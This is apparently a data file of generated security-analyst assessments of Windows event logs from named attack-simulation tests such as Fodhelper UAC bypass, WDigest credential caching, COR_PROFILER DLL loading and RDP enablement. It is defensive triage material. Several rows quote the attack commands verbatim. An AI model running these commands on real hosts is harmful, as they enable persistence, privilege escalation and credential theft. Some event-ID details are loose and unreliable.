   - The PowerShell logs detail the execution of commands that alter the Windows Registry, particularly under `HKCU:\Software\Classes\`, and create entries with `cmd.exe /c start cmd.exe`. This activity is often associated with persistence techniques and could be indicative of a potential attempt to create a backdoor or persistently elevate privileges.
   - Launching `WSReset.exe` with `windowstyle hidden` is also notable. This utility is typically used to reset the Windows Store cache. However, its invocation in this context, especially following registry manipulation to spawn command prompts, raises suspicion.

2. **Security Log Activity:**
   - Multiple `4672` events indicate that the user `admin_test` is granted special privileges (including `SeDebugPrivilege`, `SeBackupPrivilege`, etc.), which can be used for privilege escalation. While this isn't inherently malicious, coupled with suspicious PowerShell usage, it warrants further investigation.
   - `4624` logon events with NTLM authentication suggest remote access, particularly from a workstation `DESKTOP-3HL5B2P`. Any unexpected remote logins should be scrutinized.

3. **Sysmon Log Activity:**
   - Repeated executions of `wevtutil.exe` by `admin_test` might suggest log manipulation or querying activity, which can be used to track or potentially cover malicious actions.
   - The `Sysmon` logs also record the execution of `powershell.exe` and the specific command lines correspond with the suspicious registry changes seen in the PowerShell log. This supports the hypothesis of coordinated malicious activity.
   - Instances of `wsreset.exe` being triggered by PowerShell and leading to a chain of processes are consistent with the suspicious patterns typically associated with intrusion or malware behavior.

4. **Application Logs:**
   - Regular `SecurityCenter` events confirming that Windows Defender is active do not directly interlink with the suspicious activities but indicate that at least the system's basic defensive measures are operational.

### Conclusion and Recommendation:

Based on the evidence from the PowerShell, Security, and Sysmon logs, there is compelling evidence of **SUSPICIOUS** activity due to:

- The use of PowerShell for Registry modifications aimed at command shell persistence.
- Elevated privileges of an account in conjunction with unexpected remote logons.
- Execution patterns indicative of potential evasion or persistence mechanisms.

### Resolution:

- **SUSPICIOUS**: The activity detailed in the logs suggests potential malicious intent, particularly related to system persistence and privilege escalation attempts. Immediate steps should be taken to investigate any unauthorized access or configuration changes. 

### Guidance on How to Proceed:

- **Immediate Actions:**
  - Verify the legitimacy of the remote access by `admin_test` and any connections from `DESKTOP-3HL5B2P`.
  - Review user privileges, especially those related to `admin_test`, and ensure that accounts are not overprivileged.
  - Investigate the specific Registry changes thoroughly and verify their necessity and origin.
  - Conduct a comprehensive scan for malware or unauthorized software using updated definitions.

- **Follow-up:**
  - Consider enabling enhanced logging or threat detection mechanisms to monitor similar activities across other systems.
  - Educate and remind staff about cybersecurity best practices, particularly regarding PowerShell usage and account privilege management.
  - Perform a security audit to assess any potential gaps in system defenses and update security policies accordingly."
Regsvcs Uninstall Method Call Test,"### Detailed Analysis of the Logs:

#### **Suspicious or Anomalous Behavior:**

1. **Windows PowerShell Activity:** 
   - The PowerShell logs indicate the execution of scripts that involve converting a base64 encoded string into a binary key file (`key.snk`) and then using the `csc.exe` (C# compiler) to compile a DLL from a specified source file (`data.009.cs`). This DLL is then registered using `regsvcs.exe`.
   - This activity is uncommon for legitimate administrative or operational tasks and is a technique often employed by attackers to execute malicious code by injecting it into a compiled DLL.

2. **Use of System High-Risk Privileges:**
   - Event ID **4672** in the Security log indicates that the user SYSTEM (NT AUTHORITY) was granted several high-level privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, etc. While this is typical for SYSTEM processes, the usage context is important, especially if linked to suspicious activities.

3. **Process Creation and Modification by Admin_Test User:**
   - Sysmon logs show various suspicious processes launched by `admin_test`, such as conversion, compilation, and registration utilities (`csc.exe`, `regsvcs.exe`). This is unusual for regular user activities and suggests unauthorized or malicious actions.
   - Events related to COM+ objects and interfaces being modified by `admin_test` further suggest potential abuse of such components for malicious purposes.

4. **Repetitive access and operations on Microsoft and Windows Live accounts:**
   - Several Event ID **5379** entries show failed credential access attempts for MicrosoftAccount and WindowsLive services, returning a specific error code, indicating potential attempts to exfiltrate or abuse account credentials.

#### **Malicious Activity or Compromise:**

- The combination of encoding techniques, the use of a C# compiler for dynamic DLL generation and registration, and these actions being triggered via PowerShell scripts suggests attempts at executing and persisting potentially malicious code on the system.
- The highly elevated privileges, alongside the creation of objects by `admin_test`, indicate a probable point of privilege escalation and possibly compromised account behavior, aiming to fully exploit system capabilities.

### Assessment of the Situation:

The logs provided show significant indicators of potential malicious activity. The PowerShell, Sysmon, and security logs together form a pattern often associated with sophisticated exploits where attackers use scripting to introduce and execute unauthorized code. The artifacts and operations align with known tactics for deploying customized payloads using existing system tools.

### Resolution:
**MALICIOUS**

#### Guidance on How to Proceed:

1. **Immediate Action:**
   - Isolate the host `Server002` from the network to prevent further exfiltration or lateral movement.
   - Conduct a full forensic investigation to determine the origin and scope of the compromise.

2. **Investigate admin_test Account:**
   - Reset the password for `admin_test` and other privileged accounts discovered.
   - Review account permissions and activity logs to ensure further integrity.

3. **Review and Audit the Scripts:**
   - Analyze the PowerShell scripts and compiled source code (`data.009.cs`) for additional intelligence on the payload and intended functionality.

4. **Implement Enhanced Monitoring:**
   - Increase vigilance on critical hosts by deploying comprehensive endpoint detection and response tools.
   - Set up alerts for activities involving base64 encoded strings and operations matching those seen in the logs.

5. **Patch and Harden Systems:**
   - Ensure all software, including the .NET framework and Windows services, are up-to-date with the latest security patches.
   - Evaluate and improve the security baseline for PowerShell usage in your environment, limiting script execution where possible.

6. **User Awareness:**
   - Conduct security training for users focusing on recognizing and reporting suspicious activity.
   
By thoroughly investigating and addressing the identified issues, the organization can mitigate immediate risks and prevent similar incidents in the future."
Rundll32 with desk.cpl,"Based on the detailed review of the provided Windows event logs, several key observations can be made that suggest potential malicious activity:

1. **Suspicious Command Execution:**
   - There is a Sysmon Event ID 1 log indicating that `cmd.exe` is executing a command to copy `calc.exe` and rename it to `not_an_scr.scr`, followed by attempting to install it as a screensaver using `rundll32.exe`. This behavior is consistent with a technique often used for executing malicious payloads (e.g., renaming an executable to a screensaver file to bypass certain security controls).

2. **Elevation of Privileges:**
   - There are events indicating the user `admin_test` was granted several high-level privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.). While not inherently malicious, if these privileges are not typical for this user, it could suggest privilege escalation or a compromised account being used to perform unauthorized changes.

3. **Repeated Spawn of System Utilities with Administrative User:**
   - We observe multiple instances of system utilities (like `wevtutil.exe`, `conhost.exe`, and `whoami.exe`) being executed by `admin_test`. Execution of these utilities, especially in conjunction with elevated privileges or in rapid succession, may indicate reconnaissance or attempts to clear event logs.

4. **Time Adjustment Events:**
   - Security log Event ID 4616 records time adjustments on the system. While such activity can be routine, if performed without legitimate cause, it may indicate an attempt to alter timestamps associated with log events, potentially to obfuscate malicious activity.

### Assessment:

- **SUSPICIOUS**: The overall log entries indicate suspicious activity, particularly focused on potential attempts to deploy and execute a malicious payload under the guise of a screensaver, coupled with privilege escalation attempts and potentially unauthorized execution of system utilities. The activity pattern points towards a likely compromise or an insider threat.

### Recommendations:

- **Immediate Investigation:** Conduct a thorough investigation to verify the legitimacy of actions executed by the `admin_test` account and validate if these commands are routine and authorized activities or indicative of further compromise.
- **Review Privileges:** Ensure `admin_test`'s privileges are necessary for their role. Revoke any unnecessary high-level privileges.
- **System Monitoring:** Increase monitoring on `Server002` for abnormal activities or unauthorized access, especially related to `cmd.exe`, `rundll32.exe`, and other system binaries.
- **Incident Response:** Depending on the investigation results, consider engaging an incident response team to determine the scope and impact of any potential compromise.

These findings point to a significant need for careful and immediate follow-up to mitigate any potential threat."
Enable RDP via Registry (fDenyTSConnections),"Upon examining the provided Windows event logs, a few entries merit attention due to potentially suspicious activities:

1. **Time Change Events**:
    - Multiple entries indicate a change in system time (Security Events 4616 and Kernel-General EventID 1). The repeated time changes without a clear external sync justification could be a sign of malicious activity, particularly if an attacker is trying to hide their tracks or manipulate scheduled tasks.

2. **Privilege Use and Logon Events**:
    - The privilege escalation events (Security Event 4672), particularly the use of `SeDebugPrivilege`, can be an indication of a process attempting to access system-level resources. Coupling this with successful logon events (EventID 4624 Logon Type 5, which indicates a service-related logon), while not inherently malicious, should be evaluated in the broader context of simultaneous activities.

3. **Suspicious Command Execution**:
    - The Sysmon logs show execution of commands through `cmd.exe` with the parameters `""cmd.exe"" /c reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f`. This is a modification of the registry to allow Terminal Service connections, which should not occur unexpectedly and could indicate the enabling of remote access capabilities by unauthorized entities.

4. **Microsoft Edge Update Services**:
    - Multiple entries in the logs relate to the update processes for Microsoft Edge (e.g., `MicrosoftEdgeUpdate.exe`). While such activities can appear routine, the density and frequency of these operations occurring nearly simultaneously, particularly with the creation and deletion of temporary directories (as seen with paths like `C:\\Program Files (x86)\\Microsoft\\Temp\\`), warrants further exploration to ensure it's authentic and not being misused as a cover for malicious activity.

### Assessment:
Based on the above analysis, the combination of time changes, registry modifications, and dense service activity suggests that the log contains elements of potentially unauthorized or suspicious behavior. Given the modification to allow remote desktop connections and privileged access attempts, it raises concerns about potential remote access setup or privilege escalation by a malicious actor.

### Resolution: SUSPICIOUS

**Guidance**:
- Further inspect the actual configuration changes in the system such as the network settings and active services.
- Verify with IT if there were any legitimate system maintenance actions, particularly those involving registry changes and time adjustments.
- Conduct a deeper investigation into user activities, especially regarding the `admin_test` user, to verify the legitimacy of their actions around the highlighted events.
- Consider implementing greater logging and real-time alerts for similar future activities to help quickly identify unusual patterns.
"
Indirect Command Execution - forfiles.exe,"Based on a detailed analysis of the provided logs, the following assessments can be made:

### Observations:

1. **Windows Defender and System Updates:**
   - Windows Defender is active (SECURITY_PRODUCT_STATE_ON), and regular updates appear to be running, which is standard and expected for system health.

2. **Edge Update Activity:**
   - There are numerous activities related to Microsoft Edge Update, including stopping and starting services, as well as executing update-related commands. This is typical behavior for update processes and does not inherently indicate malicious activity unless paired with anomalies.

3. **Sysmon Logs:**
   - Entries show the execution of standard system utilities (`wevtutil.exe`, `cmd.exe`, `conhost.exe`, `whoami.exe`), which could be part of legitimate operations. However, `cmd.exe` with command-line execution involving `forfiles` running `calc.exe` warrants attention. Leveraging `forfiles` in this manner is unusual and might hint at a scripted process, possibly for testing or capturing screenshots. This behavior is suspicious and requires further investigation.
   - The documented execution of `cmd.exe` with the arguments `""/c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe""` is unconventional. The use of `forfiles` to execute `calc.exe` via `cmd.exe` stands out as more than routine system activity.

4. **Security Logs:**
   - The logs show privilege elevation (SeDebugPrivilege, etc.), which is typical for system processes, but these should be checked against known scheduled tasks or administrative actions to rule out unauthorized escalations.

5. **General System Activity:**
   - There are time adjustments logged, indicative of time synchronization activities, typical in many managed environments.

### Assessment:

Based on the above findings, the assessment of the activity shows a mix of typical and suspicious behaviors, particularly the execution pattern involving `cmd.exe` and `forfiles`. While no clear evidence of malicious activity is present, the nature of this command suggests potential misuse or automated tasking that could align with less benign intentions, such as malware attempting persistence or exploration.

### Resolution:

- **SUSPICIOUS** - Although most activity appears benign, the particular usage of `cmd.exe` and `forfiles` commands renders this log set ""Suspicious"". This warrants further investigation to determine the legitimacy of the process sequence, verify if it aligns with administrative scripting or automation, and ensure no unauthorized activities are present.

### Recommended Actions:

- **Investigate the Origin** of the suspicious `cmd.exe` and `forfiles` process to understand its purpose and necessity.
- **Perform a Threat Hunt** for known indicators that leverage such commands for malicious purposes.
- **Validate User Actions:** Ensure the SYSVOL for any scheduled tasks or login scripts that relate to this behavior, and cross-reference with intended administrative tasks.
- **Network Traffic Analysis:** If possible, investigate associated network traffic during these timestamps for signs of malicious exfiltration or control commands."
System Scope COR_PROFILER,"Upon reviewing the supplied event logs from the Windows host named ""Server002,"" we can identify potential indicators of compromise or abnormal behavior stemming from a particular PowerShell activity:

### Analysis Details

#### PowerShell Activity:
1. **PowerShell Invocation**: 
   - There are multiple instances (Event IDs: 1067-1074) of PowerShell events logged with the execution of a specific script which manipulates the Windows registry:
     - **Script Execution Command**: 
       ```powershell
       Write-Host ""Creating system environment variables"" -ForegroundColor Cyan
       New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null
       New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER"" -PropertyType String -Value ""{09108e71-974c-4010-89cb-acf471ae9e2c}"" -Force | Out-Null
       New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\data.012x64.dll"" -Force | Out-Null
       ```

2. **Potential Malicious Intent**:
   - **Registry Alteration**: The script modifies environment variables associated with profiling features, which are known tactics used to load malicious DLLs, indicating a possible attempt at process injection or similar advanced attack techniques.
   - **DLL Path**: The DLL path specified, located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\data.012x64.dll`), is suspicious and could indicate the presence of a malicious payload set to be executed.

#### Sysmon Log Observations:
1. **Repeated PowerShell Executions**: 
   - Events (Process executions) with PowerShell (Sysmon Event ID 17989) also indicate the launching of the PowerShell command observed in PowerShell logs.
   
2. **Conhost and Wevtutil Activity**: 
   - There are numerous instances of `conhost.exe` and `wevtutil.exe` which could suggest process execution consistency checks or hijacked process utilities for persistence or stealth, but in this context, they appear secondary to the PowerShell script.

3. **Edge Updates**:
   - Various Microsoft Edge Update processes (Sysmon Event IDs: 17995-18023) initiated under `NT AUTHORITY\SYSTEM`. While not inherently suspicious (as Edge updates are routine), the clustering of events could suggest potentially stealth maintenance activities by threat actors under disguise, but in this context, it appears routine as no malicious pattern linked.

### Conclusion

Given the findings and patterns observed, the PowerShell activity extensively modifying registry entries to alter environment variables and presumably introduce a DLL from an unconventional path strongly suggests malicious behavior.

### Resolution
Based on the evidence provided, the status of the logs is categorized as:

- **MALICIOUS**

### Recommended Actions:
1. **Immediate Isolation**: Isolate the affected host to prevent lateral movement or further compromise.
2. **Malware Analysis**: Analyze the suspicious DLL file located in the temporary path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\data.012x64.dll`) for malicious code.
3. **Registry Reversion**: Restore registry settings to a known good state and inspect for additional unauthorized changes.
4. **Comprehensive Threat Hunt**: Conduct a wider investigation across the network to ensure no similar occurrences and mitigate the threat actor's footprint.
5. **Patch and Update**: Ensure all systems are updated and patched, focusing on component vulnerabilities that could be exploited by such actors."
WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"Based on the provided logs, the following items stand out as potentially suspicious:

1. **PowerShell Execution**: The logs show the invocation of a PowerShell script executing `Invoke-CimMethod` to install a package from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_JScript.msi`. This is suspicious because:
   - The package is located in a temporary directory, which is unusual for a legitimate, trusted application installation.
   - PowerShell is often used by adversaries to execute scripts for various malicious activities, such as downloading and executing malware from temporary directories.

2. **Time Change Events**: There are multiple events indicating changes to the system time. This could be suspicious if it is intended to bypass logging, timestamp-based security mechanisms, or to disrupt time-sensitive applications.

3. **Sysmon Logs**: Frequent invocation of `powershell.exe` and `wmi-related` processes (`WmiPrvSE.exe`) by the user `SERVER002\\admin_test` can indicate potentially unwanted automation or scripts running at a high integrity level. This might be part of admin tasks but should be validated:
   - Especially considering PowerShell is used to execute a potentially suspicious MSI package.
   - The presence of `wevtutil.exe` being run multiple times, which can be used to clear logs, raises concerns.

4. **Microsoft Edge Update Process**: There are numerous entries about `MicrosoftEdgeUpdate.exe` running, which by itself can be benign if it is a legitimate update occurring. However:
   - The update process runs from `C:\\Program Files (x86)\\Microsoft\\Temp\\EU6EAE.tmp\\`, which again uses a temporary directory.
   - The execution arguments should be validated against known legitimate update activities.

5. **Installation Activity via `MsiInstaller` Logs**:
   - The `data.007_JScript.msi` seems to be installed via `msiexec` which correlates with the PowerShell activity. This is suspect especially since it is located in a temporary directory.

Based on these observations, the combination of temporary directories, PowerShell usage, and WMI activity could indicate an attempt to install/uninstall software or potentially execute more nefarious actions without proper oversight.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
1. **Investigate the Source of the MSI File**: Determine how `data.007_JScript.msi` got into the temp directory and verify its legitimacy.
2. **Inspect PowerShell and WMI Activity**: Check if the account `SERVER002\\admin_test` is authorized for such activities and validate scripts executed on the system.
3. **Verify Microsoft Edge Updates**: Ensure that the update processes align with those officially distributed by Microsoft, especially with regards to the folders involved.
4. **Review Time Change Reasons**: Confirm that the changes to system time were authorized and understand their context.
5. **System Integrity Check**: Perform an integrity check on the system, ensuring no unauthorized changes have occurred and no malware is present.

Depending on the findings, further detailed analysis or a full forensic investigation may be warranted to rule out or confirm malicious activities."
Use Powershell to Modify registry to store logon credentials,"### Detailed Analysis of Logs

#### Sysmon Log Analysis
1. **Process Execution:** A significant PowerShell command was executed, particularly:
   - `powershell.exe` launched with the command: `Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '1'`.
   - This command is explicitly modifying registry settings related to `WDigest`. Enabling `UseLogonCredential` in WDigest can potentially allow credentials to be stored in memory, which can be exploited for credential theft using tools such as Mimikatz.

2. **Unusual Activity:** Multiple instances of `wevtutil.exe` and `conhost.exe` executed under the user `SERVER002\admin_test` in quick succession. While this activity is not inherently malicious, `wevtutil.exe` is often used to clear or export event logs, which may suggest log tampering efforts.

3. **Microsoft Edge Update:** Several executions of `MicrosoftEdgeUpdate.exe` were noted, but these appear to be legitimate update processes running under `NT AUTHORITY\SYSTEM`. These activities, though frequent, are standard for updating Microsoft Edge components.

#### PowerShell Log Analysis
- PowerShell logs confirm the execution of a high-integrity (privileged) script modifying the `WDigest` registry settings. The absence of pipeline or script names indicates direct command execution within the PowerShell environment, further suggesting manual unauthorized activity.

#### System and Application Log Analysis
- **Time Changes:** Log entries indicate that the system time was adjusted. Although it doesn’t immediately suggest malicious activity, modifying system time can sometimes be associated with attempts to disrupt logs or bypass certain protections.
  
- **Windows Update:** A security update for Microsoft Defender Antivirus was successfully applied, which is a benign routine system maintenance event.

#### Security Log Analysis
- **Privileged Logon:** Event ID 4672 confirms a privileged logon with multiple high-level rights including `SeDebugPrivilege`. This suggests that administrative or system-level access was in use.

### Assessment and Guidance

**Assessment:** The presence of a PowerShell command altering the `WDigest` registry settings is a strong indicator of potential malicious intent. The context of the command aimed to store plaintext credentials in memory, possibly for credential harvesting. This is coupled with security log entries indicating the use of privileged accounts.

**Threat/Risk Identified:** 
- Possible credential dumping attempt via WDigest configuration.
- Potential follow-up malicious activities leveraging harvested credentials cannot be ruled out.

**Guidance to Proceed:**
1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent lateral movement.
   
2. **Investigation:**
   - Conduct a thorough forensic analysis to check for further signs of compromise or data exfiltration.
   - Review user activity specific to `SERVER002\admin_test` and other high-privilege accounts.
   - Check if similar registry changes have been made on other systems.

3. **Remediation:**
   - Revert the affected registry changes to default values and ensure proper configurations.
   - Strengthen monitoring on high-privilege account activities across the network.
   - Ensure that endpoint protections are active and updated with the latest security patches.

4. **User Education:**
   - Conduct awareness training highlighting the risks of credential theft techniques.

**Resolution:** **MALICIOUS** - The command to enable WDigest `UseLogonCredential` is a known tactic for preparing environments for credential dumping attacks."
Deobfuscate-Decode Files Or Information,"Based on the provided Windows event logs, let's break down and analyze the key components to assess if there are indicators of malicious activity:

### Key Observations:

1. **Security Log (EventID: 4634, 4624, 4672):**
   - **EventID 4634** signifies a user logoff, specifically for the user `admin_test` with a logon type of `3` (network logon), which is a common type for accessing systems over a network.
   - **EventID 4624** represents a successful logon for the user `admin_test` from `DESKTOP-3HL5B2P` using NTLM authentication, which might be typical depending on network configurations.
   - **EventID 4672** indicates that `admin_test` was allocated special privileges for the session, including `SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege,` etc., which are high-level privileges typically associated with administrative accounts. While this can be normal for an admin user, it's critical to verify that this access was intentional and within the scope of the user's role.

2. **Sysmon Log for Process Executions:**
   - Processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` executed under the context of user `SERVER002\\admin_test`. 
   - The command line for `cmd.exe` appears particularly suspicious as it's used to encode and decode `calc.exe` through `certutil`. This technique is often used in malicious activities to hide and execute payloads potentially. `certutil` used in this manner is a red flag for malware behavior.

3. **Schedule and Frequency of Events:**
   - Multiple Sysmon EventID 5 (Process Terminations and Creations) occur back-to-back without notable pauses, indicating potentially automated activity, which could signify script execution or automated tools.

4. **File Paths and Execution Context:**
   - The `cmd.exe` process is executed to encode `calc.exe` (a calculator application) using `certutil` and then decode it. This process does not follow typical administrative or operational behavior and typically signifies an attempt to obfuscate activity.

### Assessment:

- **Indicators of Suspicious Activity:**
  - The use of `certutil` to encode and decode files from within `cmd.exe`.
  - Privileged use of NTLM authentication and the special privileges assigned to the `admin_test` user, while being not conclusive of malicious intent, may require further verification.
  - Volume and sequence of process creation and execution especially related to system and console applications indicate automated activity potentially out of character for manual admin intervention.

### Resolution Suggestion:
- **Resolution: SUSPICIOUS**

The activity noted in the logs displays unconventional use of trusted system binaries like `certutil` to manipulate files (specifically `calc.exe`), suggesting attempts at subverting normal operational controls which is characteristic of adversarial behavior. Further investigation is warranted to ensure these activities were either sanctioned or identify if they result from malicious intent. Immediate actions could include:
- Review context and history of actions regarding `admin_test`.
- Check endpoint security solution logs for further indicators of compromise.
- Perform network analysis for corresponding sessions tied to `DESKTOP-3HL5B2P` and IP `192.168.0.102` to ascertain source legitimacy.
- Conduct Endpoint Detection and Response (EDR) scans for further artifacts or anomalies tied to this behavior."
Lolbas ie4uinit.exe use as proxy,"Based on the analysis of the provided Windows event logs, several activities stand out that warrant closer scrutiny due to potential security implications:

1. **Execution of Suspicious Commands**: The logs show a command executed by `cmd.exe` involving the copying and execution of `ie4uinit.exe` from the System32 directory to the TEMP directory. The command line `cmd.exe /c copy c:\\windows\\system32\\ie4uinit.exe %%TEMP%%\\ie4uinit.exe & copy ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\ieuinit.inf"" %%TEMP%%\\ieuinit.inf & %%TEMP%%\\ie4uinit.exe -BaseSettings` followed by execution with `-ClearIconCache` could indicate an attempt to execute malicious code or misconfigured software. Moving and executing binaries from a temporary location is often seen in malware behaviors to avoid detection by security tools.

2. **Execution of `rundll32.exe` with DLLs for Migration Tasks**: The presence of `rundll32.exe` executing with the command `C:\\Windows\\system32\\RunDll32.exe C:\\Windows\\system32\\migration\\WininetPlugin.dll,MigrateCacheForUser /m /0` may be legitimate; however, it could also be used for malicious purposes such as executing malicious DLLs under the guise of legitimate operations.

3. **Potential Privilege Misuse**: The user `admin_test` is executing several high-level processes like `powershell.exe`, `whoami.exe`, and other potential administrative tasks, which might not be typical if this account is not usually tasked with admin roles. This is particularly concerning given the timeline and sequence, indicating possible administrative script execution.

4. **Repeated Privileged Logons**: There are repeated EventID 4672 occurrences, which denote privileged logons by the `SYSTEM` user. While this can be standard in certain contexts, the frequency and clustering around the suspicious command executions might signify unusual activity worthy of further validation.

5. **Frequent Account Enumeration**: Multiple occurrences of EventID 4798 suggest repeated checks or enumerations of established user accounts such as `Administrator`, `admin_test`, `DefaultAccount`, and `Guest`, which can be an indicator of reconnaissance activity.

6. **Edge Update Processes**: The Microsoft Edge Update process is running numerous times in various contexts, which might be routine for updates; however, the volume and apparent sequence warrant verification of its authenticity and the updates being applied (e.g., checking if these match known update versions).

**Recommendations**:
- **Immediate Actions**: Conduct a deeper investigation into the `ie4uinit.exe` execution chain. Verify the integrity of this executable and other related files. Review the admin_test account to ensure its privileges and activities align with expected policy.
- **Log Monitoring**: Maintain an elevated level of monitoring for unusual use of command-line utilities like `Powershell`, `cmd.exe`, and `rundll32.exe`.
- **User Verification**: Confirm legitimacy and intended actions of user accounts especially admin's. Investigate any inexplicable entries or user activity.
- **Malware Scans**: Run comprehensive malware scans across the affected host, focusing on temporary directories and any modified binaries.
- **Audit and Rule Updates**: Consider updating Sysmon rules to capture additional context or restrict activities from TEMP directories without thorough validation checks.

Given the information, the resolution for these logs is categorized as **SUSPICIOUS**. The observed activities do not directly confirm a compromise but signal a need for a more detailed investigation to rule out malicious activities."
Odbcconf.exe - Execute Arbitrary DLL,"Upon reviewing the provided Windows event logs, we can extract and analyse several key pieces of information.

### Overview of Logs:

1. **Sysmon Logs:** 
   - High volume of Sysmon Event ID 5, which is associated with Process Termination.
   - Sysmon Event ID 1 logs, related to process creation, show visible usage of `powershell.exe`, `wevtutil.exe`, and `cmd.exe` among others.

2. **Noteworthy Sysmon Events:**
   - Log entries show repeated use of Windows utilities (`wevtutil.exe`, `whoami.exe`, `cmd.exe`, `odbcconf.exe`) which might indicate attempts for enumeration or configuration changes.
   - A particularly suspicious entry: A `cmd.exe` process with command-line arguments to execute `odbcconf.exe` with registry service registering a DLL (`data.dll`). This behavior could signify DLL hijacking or loading an unauthorized DLL on the system.

3. **Application Logs:**
   - There are multiple Windows Defender notifications indicating that the security product is operational, with no reports of threats detected.
   - `MicrosoftEdgeUpdate` services are starting and stopping, likely part of the routine update operations for Microsoft Edge.

4. **Security and System Logs:**
   - Security logs are absent, and System logs are not provided in detail, limiting insights into specific policy changes or user logon/off events.

### Analysis & Findings:

1. **Suspicious Commands and Anomalies:**
   - The combination of launching `cmd.exe` to execute `odbcconf.exe` with a command that loads a DLL from a temporary user directory is suspicious. This behavior could indicate a potentially malicious operation such as DLL sideloading or compromise.
   - While the utilization of `powershell.exe`, `wevtutil.exe`, and `whoami.exe` can be normal in administrative tasks, their activity close to the execution of an unusual `cmd` command makes them worth flagging for further investigation.

2. **Normal Operating Behavior:**
   - Edge update service activities seen in logs seem consistent with typical software update operations.
   - No malware or direct system changes via registry settings were easily discernible from logs alone.

3. **Context for Concerns:**
   - Although Windows Defender is on and has not flagged immediate threats, the existence of potentially unauthorized DLL execution requires deeper investigation.
   - The absence of detail or alerts from the security logs suggests either a deliberate event log tampering or no alerts generated during this timeframe.

### Conclusion and Recommendation: 

**Resolution: SUSPICIOUS**

Based on these logs:
- The execution of commands that attempt to register DLLs with system settings is highly suspect but can't conclusively be called malicious without additional context or corroborative alerts from security tools.
- Given the potential for malicious intent, in-depth analysis (such as examining the hash of the `data.dll` file and further forensic investigation on the system) is advised.
- Check for anomaly reports or alerts from other security solutions in place, scrutinize inbound/outbound connections during these operations, and verify against known indicators of compromise.

### Guidance:
- Isolate the system if it hasn't been already to prevent further potential propagation or compromise.
- Assess user privileges and recent changes made on the system.
- Prescribe a closer examination of the source and content of the `data.dll`.
- If possible, correlate this data with any endpoint detection and response (EDR) solutions for broader context.

This approach ensures that any potentially malicious or compromised actions are given due diligence in identification and remediation."
HTML Smuggling Remote Payload,"**Detailed Analysis:**

1. **Application Log:**
   - There are two entries related to Windows Defender showing that it is 'ON' which indicates that the system has some level of real-time protection.

2. **Security Log:**
   - Multiple entries with EventID 5379 indicate attempts to retrieve credentials using Microsoft account credentials and Windows Live tokens but have a ReturnCode of 3221226021, suggesting a failure in credential retrieval. These logs can be concerning if they continue with different ReturnCodes or suspicious source addresses.

3. **Sysmon Log:**
   - A large number of processes were executed, primarily related to Microsoft Edge updates and services. 
   - Of particular interest is the execution of `powershell.exe` with command-line content pointing to `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.006\\bin\\data_006_remote.html`. This could potentially be suspicious if it's not part of the planned tasks or administrator actions. While PowerShell usage isn't inherently malicious, execution from temp directories with such file names raises concerns of possibly an obfuscated or encoded command/script.
   - Frequent creation and execution of the Edge processes could be part of an update or malicious activity designed to mask actions. Usage of `elevation_service.exe` could suggest privilege escalation attempts which are worth exploring.
   
4. **PowerShell Log:**
   - PowerShell events correspond with the Sysmon logs, showing command execution that aligns with potentially suspicious activity (specifically the Temp directory and HTML based script execution).
   - PowerShell sessions that start and stop without clear reason, especially involving content in user temp folders, can be red flags indicating malicious scripts or payloads that are being run.

**Assessment:**

- The repeated attempts to access credentials, coupled with PowerShell activity pointing to suspicious script execution in a temporary directory merits further investigation.
- While the entries related to Edge may relate to legitimate update processes, their timing and frequency alongside other logged events necessitate a closer look to exclude them from suspicion.
- Overall, the logs demonstrate activity that could potentially be a compromise or precursor to one.

**Resolution:**

**SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation.

**Guidance on How to Proceed:**

1. **Investigate the Source:**
   - Review access logs and network traffic for unusual patterns or communication patterns with external networks.

2. **Containment:**
   - Implement network segmentation and access controls to contain the potential spread of an infection or unauthorized access.

3. **Review Windows Defender Logs:**
   - Check for any recent alerts or detection events from Windows Defender to cross-correlate with this time frame.

4. **Analyze PowerShell Scripts:**
   - Further analyze the PowerShell command and script in the temp directory for any malicious content or command obfuscation.

5. **Credential Security:**
   - Ensure that multi-factor authentication (MFA) is enforced and that there is a review of credential policies and hygiene.

6. **System and Patch Management:**
   - Verify the recent updates of all involved applications and execute any pending critical updates to mitigate any known vulnerabilities."
Bypass UAC using Fodhelper - PowerShell,"Upon reviewing the provided Windows event logs, several indicators suggest potential malicious activity:

### Analysis:

1. **Security Log**:
   - Event ID 4624 and 4672: Successful logon as SYSTEM user, which in itself is not suspicious. However, privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` indicate high-level privileges granted, though this is typical for SYSTEM logons.

2. **Windows PowerShell Log**:
   - Repeated execution of PowerShell commands modifying the registry path `HKCU:\software\classes\ms-settings\shell\open\command` to execute `cmd.exe`, followed by starting `fodhelper.exe`. This is indicative of an attempt at a User Account Control (UAC) bypass using the FodHelper technique. This technique exploits a flaw where `fodhelper.exe` is launched without prompt for elevation.

3. **Sysmon Log**:
